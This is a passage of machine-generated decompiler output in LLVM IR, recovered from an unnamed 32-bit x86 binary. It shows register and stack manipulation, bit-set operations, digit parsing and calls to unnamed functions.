  %v3_804976b = inttoptr i32 %v2_804976b to i32*
  store i32 %v1_8049768, i32* %v3_804976b, align 4
  br label %dec_label_pc_804958e

dec_label_pc_8049773:                             ; preds = %dec_label_pc_804854f
  %v1_8049773 = add i32 %v0_80485a5, -1440
  %v2_8049773 = inttoptr i32 %v1_8049773 to i32*
  %v3_8049773 = load i32, i32* %v2_8049773, align 4
  %v1_804977b = urem i32 %v3_8049773, 32
  store i32 %v1_804977b, i32* %eax.global-to-local, align 4
  %v2_804977e = udiv i32 %v3_8049773, 32
  store i32 %v2_804977e, i32* %edx.global-to-local, align 4
  %v0_8049781 = load i32, i32* @esp, align 4
  %v2_8049781 = mul nuw nsw i32 %v2_804977e, 4
  %v3_8049781 = add nuw nsw i32 %v2_8049781, 20740
  %v4_8049781 = add i32 %v3_8049781, %v0_8049781
  %v5_8049781 = inttoptr i32 %v4_8049781 to i32*
  %v6_8049781 = load i32, i32* %v5_8049781, align 4
  %v9_8049781 = shl i32 1, %v1_804977b
  %v12_8049781 = or i32 %v6_8049781, %v9_8049781
  store i32 %v12_8049781, i32* %v5_8049781, align 4
  %v0_8049789 = load i32, i32* @esi, align 4
  %v1_8049789 = add i32 %v0_8049789, -1440
  %v2_8049789 = inttoptr i32 %v1_8049789 to i32*
  %v3_8049789 = load i32, i32* %v2_8049789, align 4
  store i32 %v3_8049789, i32* %eax.global-to-local, align 4
  %v1_804978f = load i32, i32* @esp, align 4
  %v2_804978f = add i32 %v1_804978f, 72
  %v3_804978f = inttoptr i32 %v2_804978f to i32*
  %v4_804978f = load i32, i32* %v3_804978f, align 4
  %v5_804978f = sub i32 %v3_8049789, %v4_804978f
  %v11_804978f = xor i32 %v4_804978f, %v3_8049789
  %v12_804978f = xor i32 %v5_804978f, %v3_8049789
  %v13_804978f = and i32 %v12_804978f, %v11_804978f
  %v14_804978f = icmp slt i32 %v13_804978f, 0
  %v15_804978f = icmp eq i32 %v5_804978f, 0
  store i1 %v15_804978f, i1* %zf.global-to-local, align 1
  %v16_804978f = icmp slt i32 %v5_804978f, 0
  %v3_8049793 = icmp ne i1 %v16_804978f, %v14_804978f
  %v4_8049793 = or i1 %v15_804978f, %v3_8049793
  br i1 %v4_8049793, label %dec_label_pc_8048582, label %dec_label_pc_80486e4

dec_label_pc_804979e:                             ; preds = %dec_label_pc_8048c10
  %v2_804979e = add i32 %v0_8048c1d, 12
  %v3_804979e = inttoptr i32 %v2_804979e to i32*
  store i32 %v3_8048bde, i32* %v3_804979e, align 4
  %v2_804979f = add i32 %v0_8048c1d, 8
  %v3_804979f = inttoptr i32 %v2_804979f to i32*
  store i32 %v3_8048bde, i32* %v3_804979f, align 4
  %v0_80497a0 = load i32, i32* @esi, align 4
  %v2_80497a0 = add i32 %v0_8048c1d, 4
  %v3_80497a0 = inttoptr i32 %v2_80497a0 to i32*
  store i32 %v0_80497a0, i32* %v3_80497a0, align 4
  %v1_80497a1 = add i32 %v0_8048c1d, 112
  %v2_80497a1 = inttoptr i32 %v1_80497a1 to i32*
  %v3_80497a1 = load i32, i32* %v2_80497a1, align 4
  store i32 %v3_80497a1, i32* @ebx, align 4
  %v3_80497a5 = inttoptr i32 %v0_8048c1d to i32*
  store i32 %v3_80497a1, i32* %v3_80497a5, align 4
  %v3_80497a6 = call i32 @function_8051cc0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_80497a6, i32* %eax.global-to-local, align 4
  %v0_80497ab = load i32, i32* @esp, align 4
  %v1_80497ab = add i32 %v0_80497ab, 16
  %v6_80497ab = icmp eq i32 %v1_80497ab, 0
  store i1 %v6_80497ab, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8048c28

dec_label_pc_80497b3:                             ; preds = %dec_label_pc_8048d89
  %v1_80497b3 = call i32 @function_8052779(i32 %stack_var_-20924.0.ph)
  store i32 %v1_80497b3, i32* %eax.global-to-local, align 4
  store i32 %v1_80497b3, i32* @ebx, align 4
  br label %dec_label_pc_80497ba

dec_label_pc_80497ba:                             ; preds = %dec_label_pc_80497ed, %dec_label_pc_80497b3
  %v0_80497ba = phi i32 [ %v1_80497b3, %dec_label_pc_80497b3 ], [ %v0_80497ba.pre, %dec_label_pc_80497ed ]
  %v1_80497ba = inttoptr i32 %v0_80497ba to i32*
  store i32 0, i32* %v1_80497ba, align 4
  %v0_80497c0 = load i32, i32* @esp, align 4
  %v1_80497c0 = add i32 %v0_80497c0, -4
  %v2_80497c0 = inttoptr i32 %v1_80497c0 to i32*
  store i32 16384, i32* %v2_80497c0, align 4
  %v1_80497c5 = add i32 %v0_80497c0, -8
  %v2_80497c5 = inttoptr i32 %v1_80497c5 to i32*
  store i32 10240, i32* %v2_80497c5, align 4
  %v1_80497ca = add i32 %v0_80497c0, 131
  store i32 %v1_80497ca, i32* %ecx.global-to-local, align 4
  %v2_80497d1 = add i32 %v0_80497c0, -12
  %v3_80497d1 = inttoptr i32 %v2_80497d1 to i32*
  store i32 %v1_80497ca, i32* %v3_80497d1, align 4
  %v1_80497d2 = add i32 %v0_80497c0, 92
  %v2_80497d2 = inttoptr i32 %v1_80497d2 to i32*
  %v3_80497d2 = load i32, i32* %v2_80497d2, align 4
  store i32 %v3_80497d2, i32* %eax.global-to-local, align 4
  %v1_80497d6 = add i32 %v3_80497d2, -1452
  %v2_80497d6 = inttoptr i32 %v1_80497d6 to i32*
  %v3_80497d6 = load i32, i32* %v2_80497d6, align 4
  %v2_80497dc = add i32 %v0_80497c0, -16
  %v3_80497dc = inttoptr i32 %v2_80497dc to i32*
  store i32 %v3_80497d6, i32* %v3_80497dc, align 4
  %v0_80497dd = call i32 @function_805290e()
  store i32 %v0_80497dd, i32* %eax.global-to-local, align 4
  %v0_80497e2 = load i32, i32* @esp, align 4
  %v1_80497e2 = add i32 %v0_80497e2, 16
  %v1_80497e5 = icmp eq i32 %v0_80497dd, 0
  store i1 %v1_80497e5, i1* %zf.global-to-local, align 1
  br i1 %v1_80497e5, label %dec_label_pc_8049b04, label %dec_label_pc_80497ed

dec_label_pc_80497ed:                             ; preds = %dec_label_pc_80497ba
  %v1_80497ed = add i32 %v0_80497dd, 1
  %v8_80497ed = icmp eq i32 %v1_80497ed, 0
  store i1 %v8_80497ed, i1* %zf.global-to-local, align 1
  store i32 %v1_80497ed, i32* %eax.global-to-local, align 4
  %v1_80497ee = icmp eq i1 %v8_80497ed, false
  %v0_80497ba.pre = load i32, i32* @ebx, align 4
  br i1 %v1_80497ee, label %dec_label_pc_80497ba, label %dec_label_pc_80497f0

dec_label_pc_80497f0:                             ; preds = %dec_label_pc_80497ed
  %v1_80497f0 = inttoptr i32 %v0_80497ba.pre to i32*
  %v2_80497f0 = load i32, i32* %v1_80497f0, align 4
  %v11_80497f0 = icmp eq i32 %v2_80497f0, 11
  store i1 %v11_80497f0, i1* %zf.global-to-local, align 1
  br i1 %v11_80497f0, label %dec_label_pc_8049c31, label %dec_label_pc_80497f9

dec_label_pc_80497f9:                             ; preds = %dec_label_pc_80497f0, %dec_label_pc_8049b04
  %v0_80497f9 = phi i32 [ %v1_80497e2, %dec_label_pc_80497f0 ], [ %v0_80497f9.pre, %dec_label_pc_8049b04 ]
  %v9_80497f9 = icmp eq i32 %v0_80497f9, 12
  store i1 %v9_80497f9, i1* %zf.global-to-local, align 1
  %v1_80497fc = add i32 %v0_80497f9, 92
  %v2_80497fc = inttoptr i32 %v1_80497fc to i32*
  %v3_80497fc = load i32, i32* %v2_80497fc, align 4
  store i32 %v3_80497fc, i32* %edx.global-to-local, align 4
  %v1_8049800 = add i32 %v3_80497fc, -1452
  %v2_8049800 = inttoptr i32 %v1_8049800 to i32*
  %v3_8049800 = load i32, i32* %v2_8049800, align 4
  store i32 %v3_8049800, i32* %ecx.global-to-local, align 4
  %v2_8049806 = add i32 %v0_80497f9, -16
  %v3_8049806 = inttoptr i32 %v2_8049806 to i32*
  store i32 %v3_8049800, i32* %v3_8049806, align 4
  %v1_8049807 = call i32 @function_8052241(i32 %stack_var_-20924.0.ph)
  store i32 %v1_8049807, i32* %eax.global-to-local, align 4
  %v0_804980c = load i32, i32* @esp, align 4
  %v1_804980c = add i32 %v0_804980c, 108
  %v2_804980c = inttoptr i32 %v1_804980c to i32*
  %v3_804980c = load i32, i32* %v2_804980c, align 4
  store i32 %v3_804980c, i32* %ecx.global-to-local, align 4
  %v6_8049810 = icmp eq i32 %v0_804980c, -16
  store i1 %v6_8049810, i1* %zf.global-to-local, align 1
  %v1_8049813 = add i32 %v3_804980c, -1452
  %v2_8049813 = inttoptr i32 %v1_8049813 to i32*
  store i32 -1, i32* %v2_8049813, align 4
  %v0_804981d = load i32, i32* %ecx.global-to-local, align 4
  %v1_804981d = add i32 %v0_804981d, -1448
  %v2_804981d = inttoptr i32 %v1_804981d to i8*
  store i8 0, i8* %v2_804981d, align 1
  br label %dec_label_pc_8048d91

dec_label_pc_8049829:                             ; preds = %dec_label_pc_8048557
  %v1_8049829 = add i32 %v0_80485a5, -1440
  %v2_8049829 = inttoptr i32 %v1_8049829 to i32*
  %v3_8049829 = load i32, i32* %v2_8049829, align 4
  %v1_8049831 = urem i32 %v3_8049829, 32
  store i32 %v1_8049831, i32* %eax.global-to-local, align 4
  %v2_8049834 = udiv i32 %v3_8049829, 32
  store i32 %v2_8049834, i32* %edx.global-to-local, align 4
  %v0_8049837 = load i32, i32* @esp, align 4
  %v2_8049837 = mul nuw nsw i32 %v2_8049834, 4
  %v3_8049837 = add nuw nsw i32 %v2_8049837, 20740
  %v4_8049837 = add i32 %v3_8049837, %v0_8049837
  %v5_8049837 = inttoptr i32 %v4_8049837 to i32*
  %v6_8049837 = load i32, i32* %v5_8049837, align 4
  %v9_8049837 = shl i32 1, %v1_8049831
  %v12_8049837 = or i32 %v6_8049837, %v9_8049837
  store i32 %v12_8049837, i32* %v5_8049837, align 4
  %v0_804983f = load i32, i32* @esi, align 4
  %v1_804983f = add i32 %v0_804983f, -1440
  %v2_804983f = inttoptr i32 %v1_804983f to i32*
  %v3_804983f = load i32, i32* %v2_804983f, align 4
  store i32 %v3_804983f, i32* %eax.global-to-local, align 4
  %v1_8049845 = load i32, i32* @esp, align 4
  %v2_8049845 = add i32 %v1_8049845, 72
  %v3_8049845 = inttoptr i32 %v2_8049845 to i32*
  %v4_8049845 = load i32, i32* %v3_8049845, align 4
  %v5_8049845 = sub i32 %v3_804983f, %v4_8049845
  %v11_8049845 = xor i32 %v4_8049845, %v3_804983f
  %v12_8049845 = xor i32 %v5_8049845, %v3_804983f
  %v13_8049845 = and i32 %v12_8049845, %v11_8049845
  %v14_8049845 = icmp slt i32 %v13_8049845, 0
  %v15_8049845 = icmp eq i32 %v5_8049845, 0
  store i1 %v15_8049845, i1* %zf.global-to-local, align 1
  %v16_8049845 = icmp slt i32 %v5_8049845, 0
  %v3_8049849 = icmp ne i1 %v16_8049845, %v14_8049845
  %v4_8049849 = or i1 %v15_8049845, %v3_8049849
  br i1 %v4_8049849, label %dec_label_pc_8048582, label %dec_label_pc_80486e4

dec_label_pc_8049854:                             ; preds = %dec_label_pc_80493fd, %dec_label_pc_80493d2
  %v1_8049854.in = phi i32 [ %v0_8049452, %dec_label_pc_80493fd ], [ %v0_80493f3, %dec_label_pc_80493d2 ]
  %v0_8049854 = load i32, i32* @edi, align 4
  %v2_8049854 = add i32 %v1_8049854.in, 12
  %v3_8049854 = inttoptr i32 %v2_8049854 to i32*
  store i32 %v0_8049854, i32* %v3_8049854, align 4
  %v0_8049855 = load i32, i32* @edi, align 4
  %v2_8049855 = add i32 %v1_8049854.in, 8
  %v3_8049855 = inttoptr i32 %v2_8049855 to i32*
  store i32 %v0_8049855, i32* %v3_8049855, align 4
  %v1_8049856 = add i32 %v1_8049854.in, 4
  %v2_8049856 = inttoptr i32 %v1_8049856 to i32*
  store i32 0, i32* %v2_8049856, align 4
  %v2_8049858 = inttoptr i32 %v1_8049854.in to i32*
  store i32 37, i32* %v2_8049858, align 4
  %v3_804985a = call i32 @function_80512a0(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_804985a, i32* %eax.global-to-local, align 4
  %v0_804985f = load i32, i32* @esp, align 4
  %v9_804985f = icmp eq i32 %v0_804985f, -12
  store i1 %v9_804985f, i1* %zf.global-to-local, align 1
  %v2_8049862 = add i32 %v0_804985f, 8
  %v3_8049862 = inttoptr i32 %v2_8049862 to i32*
  store i32 %v3_804985a, i32* %v3_8049862, align 4
  %v1_8049863 = add i32 %v0_804985f, 120
  %v2_8049863 = inttoptr i32 %v1_8049863 to i32*
  %v3_8049863 = load i32, i32* %v2_8049863, align 4
  %v2_8049867 = add i32 %v0_804985f, 4
  %v3_8049867 = inttoptr i32 %v2_8049867 to i32*
  store i32 %v3_8049863, i32* %v3_8049867, align 4
  %v1_8049868 = add i32 %v0_804985f, 147
  store i32 %v1_8049868, i32* @ecx, align 4
  %v3_804986f = inttoptr i32 %v0_804985f to i32*
  store i32 %v1_8049868, i32* %v3_804986f, align 4
  %v4_8049870 = call i32 @function_8051f90(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_8049875 = load i32, i32* @esp, align 4
  %v1_8049875 = add i32 %v0_8049875, 16
  %v1_8049878 = add i32 %v4_8049870, 1
  %v8_8049878 = icmp eq i32 %v1_8049878, 0
  store i1 %v8_8049878, i1* %zf.global-to-local, align 1
  store i32 %v1_8049878, i32* %eax.global-to-local, align 4
  br i1 %v8_8049878, label %dec_label_pc_8049a77, label %dec_label_pc_804987f

dec_label_pc_804987f:                             ; preds = %dec_label_pc_8049854
  %v0_804987f = load i32, i32* @ebx, align 4
  %v2_804987f = add i32 %v0_8049875, 12
  %v3_804987f = inttoptr i32 %v2_804987f to i32*
  store i32 %v0_804987f, i32* %v3_804987f, align 4
  %v0_8049880 = load i32, i32* @ebx, align 4
  %v2_8049880 = add i32 %v0_8049875, 8
  %v3_8049880 = inttoptr i32 %v2_8049880 to i32*
  store i32 %v0_8049880, i32* %v3_8049880, align 4
  %v1_8049881 = add i32 %v0_8049875, 4
  %v2_8049881 = inttoptr i32 %v1_8049881 to i32*
  store i32 0, i32* %v2_8049881, align 4
  %v2_8049883 = inttoptr i32 %v0_8049875 to i32*
  store i32 37, i32* %v2_8049883, align 4
  %v3_8049885 = call i32 @function_80512a0(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_8049885, i32* %eax.global-to-local, align 4
  %v0_804988a = load i32, i32* @esp, align 4
  %v9_804988a = icmp eq i32 %v0_804988a, -12
  store i1 %v9_804988a, i1* %zf.global-to-local, align 1
  %v2_804988d = add i32 %v0_804988a, 8
  %v3_804988d = inttoptr i32 %v2_804988d to i32*
  store i32 %v3_8049885, i32* %v3_804988d, align 4
  %v1_804988e = add i32 %v0_804988a, 120
  %v2_804988e = inttoptr i32 %v1_804988e to i32*
  %v3_804988e = load i32, i32* %v2_804988e, align 4
  store i32 %v3_804988e, i32* @ecx, align 4
  %v2_8049892 = add i32 %v0_804988a, 4
  %v3_8049892 = inttoptr i32 %v2_8049892 to i32*
  store i32 %v3_804988e, i32* %v3_8049892, align 4
  %v1_8049893 = add i32 %v0_804988a, 147
  store i32 %v1_8049893, i32* %eax.global-to-local, align 4
  %v3_804989a = inttoptr i32 %v0_804988a to i32*
  store i32 %v1_8049893, i32* %v3_804989a, align 4
  %v4_804989b = call i32 @function_8051f90(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804989b, i32* %eax.global-to-local, align 4
  %v0_80498a0 = load i32, i32* @esp, align 4
  %v6_80498a0 = icmp eq i32 %v0_80498a0, -16
  store i1 %v6_80498a0, i1* %zf.global-to-local, align 1
  store i32 %v4_804989b, i32* %ebx.global-to-local, align 4
  %v3_80498a5 = add i32 %v4_804989b, 147
  %v4_80498a5 = add i32 %v3_80498a5, %v0_80498a0
  %v5_80498a5 = inttoptr i32 %v4_80498a5 to i8*
  %v6_80498a5 = load i8, i8* %v5_80498a5, align 1
  %v12_80498a5 = icmp eq i8 %v6_80498a5, 32
  %v1_80498ad = zext i1 %v12_80498a5 to i32
  %v1_80498b0 = add i32 %v0_80498a0, 147
  store i32 %v1_80498b0, i32* %esi.global-to-local, align 4
  store i32 %v1_80498ad, i32* %eax.global-to-local, align 4
  %v1_80498bc = add i32 %v0_80498a0, 12
  %v2_80498bc = inttoptr i32 %v1_80498bc to i32*
  store i32 2, i32* %v2_80498bc, align 4
  %v1_80498be = add i32 %v0_80498a0, 8
  %v2_80498be = inttoptr i32 %v1_80498be to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8054b66.10 to i32), i32* %v2_80498be, align 4
  %v0_80498c3 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80498c3 = load i32, i32* %eax.global-to-local, align 4
  %v2_80498c3 = add i32 %v1_80498c3, %v0_80498c3
  store i32 %v2_80498c3, i32* @ebx, align 4
  %v1_80498c5 = add i32 %v0_80498a0, 120
  %v2_80498c5 = inttoptr i32 %v1_80498c5 to i32*
  %v3_80498c5 = load i32, i32* %v2_80498c5, align 4
  %v2_80498c9 = sub i32 %v3_80498c5, %v2_80498c3
  store i32 %v2_80498c9, i32* %eax.global-to-local, align 4
  %v0_80498cb = load i32, i32* %esi.global-to-local, align 4
  %v2_80498cb = add i32 %v0_80498cb, %v2_80498c3
  %v12_80498cb = icmp eq i32 %v2_80498cb, 0
  store i1 %v12_80498cb, i1* %zf.global-to-local, align 1
  store i32 %v2_80498cb, i32* @esi, align 4
  %v2_80498cd = add i32 %v0_80498a0, 4
  %v3_80498cd = inttoptr i32 %v2_80498cd to i32*
  store i32 %v2_80498c9, i32* %v3_80498cd, align 4
  %v0_80498ce = load i32, i32* @esi, align 4
  %v3_80498ce = inttoptr i32 %v0_80498a0 to i32*
  store i32 %v0_80498ce, i32* %v3_80498ce, align 4
  %v0_80498cf = call i32 @function_8051d50()
  store i32 %v0_80498cf, i32* %eax.global-to-local, align 4
  %v0_80498d4 = load i32, i32* @esp, align 4
  %v1_80498d4 = add i32 %v0_80498d4, 16
  store i32 %v0_80498cf, i32* @edi, align 4
  %v10_80498d9 = icmp eq i32 %v0_80498cf, -1
  store i1 %v10_80498d9, i1* %zf.global-to-local, align 1
  br i1 %v10_80498d9, label %dec_label_pc_8049a77, label %dec_label_pc_80498e2

dec_label_pc_80498e2:                             ; preds = %dec_label_pc_804987f
  %v10_80498e2 = icmp eq i32 %v0_80498cf, 1
  store i1 %v10_80498e2, i1* %zf.global-to-local, align 1
  %v7_80498e5 = icmp sgt i32 %v0_80498cf, 1
  br i1 %v7_80498e5, label %dec_label_pc_80498e7, label %dec_label_pc_80498ea

dec_label_pc_80498e7:                             ; preds = %dec_label_pc_80498e2
  %v1_80498e7 = add i32 %v0_80498cf, -2
  %v9_80498e7 = icmp eq i32 %v1_80498e7, 0
  store i1 %v9_80498e7, i1* %zf.global-to-local, align 1
  store i32 %v1_80498e7, i32* @edi, align 4
  br label %dec_label_pc_80498ea

dec_label_pc_80498ea:                             ; preds = %dec_label_pc_80498e2, %dec_label_pc_80498e7
  %v1_80498ea = add i32 %v0_80498d4, 20920
  store i32 %v1_80498ea, i32* %eax.global-to-local, align 4
  %v1_80498f1 = add i32 %v0_80498d4, 20916
  %v2_80498f1 = inttoptr i32 %v1_80498f1 to i32*
  store i32 0, i32* %v2_80498f1, align 4
  %v0_80498fc = load i32, i32* %eax.global-to-local, align 4
  %v1_80498fc = load i32, i32* @ebx, align 4
  %v2_80498fc = add i32 %v1_80498fc, %v0_80498fc
  %v12_80498fc = icmp eq i32 %v2_80498fc, 0
  store i1 %v12_80498fc, i1* %zf.global-to-local, align 1
  store i32 %v2_80498fc, i32* %eax.global-to-local, align 4
  %v0_80498fe = load i32, i32* @esi, align 4
  store i32 %v0_80498fe, i32* %edx.global-to-local, align 4
  %v1_8049900 = load i32, i32* @edi, align 4
  %v2_8049900 = add i32 %v2_80498fc, -20773
  %v3_8049900 = add i32 %v2_8049900, %v1_8049900
  %v4_8049900 = inttoptr i32 %v3_8049900 to i8*
  store i8 0, i8* %v4_8049900, align 1
  %v0_8049908 = load i32, i32* @esi, align 4
  %v1_8049908 = inttoptr i32 %v0_8049908 to i8*
  %v2_8049908 = load i8, i8* %v1_8049908, align 1
  %v3_8049908 = zext i8 %v2_8049908 to i32
  %v4_8049908 = load i32, i32* @ecx, align 4
  %v5_8049908 = and i32 %v4_8049908, -256
  %v6_8049908 = or i32 %v5_8049908, %v3_8049908
  store i32 %v6_8049908, i32* @ecx, align 4
  %v1_804990a = add i32 %v6_8049908, -48
  store i32 %v1_804990a, i32* %eax.global-to-local, align 4
  %v1_804990d = trunc i32 %v1_804990a to i8
  %v10_804990d = icmp eq i8 %v1_804990d, 9
  store i1 %v10_804990d, i1* %zf.global-to-local, align 1
  %tmp240 = icmp ult i8 %v1_804990d, 10
  br i1 %tmp240, label %dec_label_pc_8049911, label %dec_label_pc_8049928

dec_label_pc_8049911:                             ; preds = %dec_label_pc_80498ea
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8049913

dec_label_pc_8049913:                             ; preds = %dec_label_pc_8049913, %dec_label_pc_8049911
  %v0_8049913 = phi i32 [ %v0_804991b, %dec_label_pc_8049913 ], [ 0, %dec_label_pc_8049911 ]
  %v1_8049913 = add i32 %v0_8049913, 1
  %v8_8049913 = icmp eq i32 %v1_8049913, 0
  store i1 %v8_8049913, i1* %zf.global-to-local, align 1
  store i32 %v1_8049913, i32* %edx.global-to-local, align 4
  %v1_8049914 = load i32, i32* @esp, align 4
  %v2_8049914 = add i32 %v1_8049914, 20900
  %v3_8049914 = inttoptr i32 %v2_8049914 to i32*
  store i32 %v1_8049913, i32* %v3_8049914, align 4
  %v0_804991b = load i32, i32* %edx.global-to-local, align 4
  %v1_804991b = load i32, i32* @esi, align 4
  %v2_804991b = add i32 %v1_804991b, %v0_804991b
  %v3_804991b = inttoptr i32 %v2_804991b to i8*
  %v4_804991b = load i8, i8* %v3_804991b, align 1
  %v5_804991b = zext i8 %v4_804991b to i32
  %v6_804991b = load i32, i32* @ecx, align 4
  %v7_804991b = and i32 %v6_804991b, -256
  %v8_804991b = or i32 %v7_804991b, %v5_804991b
  store i32 %v8_804991b, i32* @ecx, align 4
  %v1_804991e = add i32 %v8_804991b, -48
  store i32 %v1_804991e, i32* %eax.global-to-local, align 4
  %v1_8049921 = trunc i32 %v1_804991e to i8
  %v10_8049921 = icmp eq i8 %v1_8049921, 9
  store i1 %v10_8049921, i1* %zf.global-to-local, align 1
  %tmp241 = icmp ult i8 %v1_8049921, 10
  br i1 %tmp241, label %dec_label_pc_8049913, label %dec_label_pc_8049925

dec_label_pc_8049925:                             ; preds = %dec_label_pc_8049913
  store i32 %v2_804991b, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8049928

dec_label_pc_8049928:                             ; preds = %dec_label_pc_80498ea, %dec_label_pc_8049925
  %v0_8049928 = phi i32 [ %v6_8049908, %dec_label_pc_80498ea ], [ %v8_804991b, %dec_label_pc_8049925 ]
  %v3_8049928 = trunc i32 %v0_8049928 to i8
  %v4_8049928 = icmp eq i8 %v3_8049928, 0
  store i1 %v4_8049928, i1* %zf.global-to-local, align 1
  br i1 %v4_8049928, label %dec_label_pc_8049928.dec_label_pc_8049a77_crit_edge, label %dec_label_pc_8049930

dec_label_pc_8049928.dec_label_pc_8049a77_crit_edge: ; preds = %dec_label_pc_8049928
  %v0_8049a77.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8049a77

dec_label_pc_8049930:                             ; preds = %dec_label_pc_8049928
  %v0_8049930 = load i32, i32* %edx.global-to-local, align 4
  %v1_8049930 = inttoptr i32 %v0_8049930 to i8*
  store i8 0, i8* %v1_8049930, align 1
  %v0_8049933 = load i32, i32* @esp, align 4
  %v1_8049933 = add i32 %v0_8049933, 20900
  %v2_8049933 = inttoptr i32 %v1_8049933 to i32*
  %v3_8049933 = load i32, i32* %v2_8049933, align 4
  store i32 %v3_8049933, i32* %edx.global-to-local, align 4
  %v1_804993a = add i32 %v3_8049933, 1
  store i32 %v1_804993a, i32* %eax.global-to-local, align 4
  store i32 %v1_804993a, i32* %v2_8049933, align 4
  %v0_8049944 = load i32, i32* @esi, align 4
  %v1_8049944 = load i32, i32* %eax.global-to-local, align 4
  %v2_8049944 = add i32 %v1_8049944, %v0_8049944
  %v3_8049944 = inttoptr i32 %v2_8049944 to i8*
  %v4_8049944 = load i8, i8* %v3_8049944, align 1
  %v10_8049944 = icmp eq i8 %v4_8049944, 32
  store i1 %v10_8049944, i1* %zf.global-to-local, align 1
  br i1 %v10_8049944, label %dec_label_pc_8049ee6, label %dec_label_pc_804994e

dec_label_pc_804994e:                             ; preds = %dec_label_pc_8049930, %dec_label_pc_8049ee6
  %v0_8049951 = phi i32 [ %v0_8049944, %dec_label_pc_8049930 ], [ %v0_8049951.pre, %dec_label_pc_8049ee6 ]
  %v0_804994e = load i32, i32* @esp, align 4
  store i32 %v0_8049951, i32* %eax.global-to-local, align 4
  %v1_8049953 = add i32 %v0_804994e, 20900
  %v2_8049953 = inttoptr i32 %v1_8049953 to i32*
  %v3_8049953 = load i32, i32* %v2_8049953, align 4
  store i32 %v3_8049953, i32* %edx.global-to-local, align 4
  %v2_804995a = add i32 %v3_8049953, %v0_8049951
  %v12_804995a = icmp eq i32 %v2_804995a, 0
  store i1 %v12_804995a, i1* %zf.global-to-local, align 1
  store i32 %v2_804995a, i32* %eax.global-to-local, align 4
  %v2_804995c = add i32 %v0_804994e, -16
  %v3_804995c = inttoptr i32 %v2_804995c to i32*
  store i32 %v2_804995a, i32* %v3_804995c, align 4
  %v2_804995d = call i32 @function_8051ca0(i8* %v1_8048752)
  store i32 %v2_804995d, i32* %eax.global-to-local, align 4
  %v0_8049962 = load i32, i32* @esp, align 4
  %v1_8049965 = add i32 %v0_8049962, 8
  %v2_8049965 = inttoptr i32 %v1_8049965 to i32*
  store i32 ptrtoint ([5 x i8]* @global_var_8054b70.17 to i32), i32* %v2_8049965, align 4
  %v2_804996a = add i32 %v0_8049962, 4
  %v3_804996a = inttoptr i32 %v2_804996a to i32*
  store i32 %v2_804995d, i32* %v3_804996a, align 4
  %v1_804996b = add i32 %v0_8049962, 20916
  %v2_804996b = inttoptr i32 %v1_804996b to i32*
  %v3_804996b = load i32, i32* %v2_804996b, align 4
  store i32 %v3_804996b, i32* @ebp, align 4
  %v0_8049972 = load i32, i32* @esi, align 4
  %v2_8049974 = add i32 %v0_8049972, %v3_804996b
  %v12_8049974 = icmp eq i32 %v2_8049974, 0
  store i1 %v12_8049974, i1* %zf.global-to-local, align 1
  store i32 %v2_8049974, i32* %eax.global-to-local, align 4
  %v3_8049976 = inttoptr i32 %v0_8049962 to i32*
  store i32 %v2_8049974, i32* %v3_8049976, align 4
  %v4_8049977 = call i32 @function_8051f90(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_804997c = load i32, i32* @esp, align 4
  %v1_804997c = add i32 %v0_804997c, 16
  %v1_804997f = add i32 %v4_8049977, 1
  %v8_804997f = icmp eq i32 %v1_804997f, 0
  store i1 %v8_804997f, i1* %zf.global-to-local, align 1
  store i32 %v1_804997f, i32* %eax.global-to-local, align 4
  br i1 %v8_804997f, label %dec_label_pc_80499c3, label %dec_label_pc_8049982

dec_label_pc_8049982:                             ; preds = %dec_label_pc_804994e
  %v0_8049985 = load i32, i32* @esi, align 4
  store i32 %v0_8049985, i32* %eax.global-to-local, align 4
  %v1_8049987 = add i32 %v0_804997c, 20916
  %v2_8049987 = inttoptr i32 %v1_8049987 to i32*
  %v3_8049987 = load i32, i32* %v2_8049987, align 4
  %v2_804998e = add i32 %v3_8049987, %v0_8049985
  %v12_804998e = icmp eq i32 %v2_804998e, 0
  store i1 %v12_804998e, i1* %zf.global-to-local, align 1
  store i32 %v2_804998e, i32* %eax.global-to-local, align 4
  %v3_8049990 = inttoptr i32 %v0_804997c to i32*
  store i32 %v2_804998e, i32* %v3_8049990, align 4
  %v2_8049991 = call i32 @function_8051ca0(i8* %v1_8048752)
  store i32 %v2_8049991, i32* %eax.global-to-local, align 4
  %v0_8049996 = load i32, i32* @esp, align 4
  %v1_8049999 = add i32 %v0_8049996, 8
  %v2_8049999 = inttoptr i32 %v1_8049999 to i32*
  store i32 ptrtoint ([5 x i8]* @global_var_8054b70.17 to i32), i32* %v2_8049999, align 4
  %v2_804999e = add i32 %v0_8049996, 4
  %v3_804999e = inttoptr i32 %v2_804999e to i32*
  store i32 %v2_8049991, i32* %v3_804999e, align 4
  %v1_804999f = add i32 %v0_8049996, 20916
  %v2_804999f = inttoptr i32 %v1_804999f to i32*
  %v3_804999f = load i32, i32* %v2_804999f, align 4
  store i32 %v3_804999f, i32* @ecx, align 4
  %v0_80499a6 = load i32, i32* @esi, align 4
  %v2_80499a8 = add i32 %v0_80499a6, %v3_804999f
  %v12_80499a8 = icmp eq i32 %v2_80499a8, 0
  store i1 %v12_80499a8, i1* %zf.global-to-local, align 1
  store i32 %v2_80499a8, i32* %eax.global-to-local, align 4
  %v3_80499aa = inttoptr i32 %v0_8049996 to i32*
  store i32 %v2_80499a8, i32* %v3_80499aa, align 4
  %v4_80499ab = call i32 @function_8051f90(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_80499ab, i32* %eax.global-to-local, align 4
  %v0_80499b0 = load i32, i32* @esp, align 4
  %v1_80499b0 = add i32 %v0_80499b0, 20916
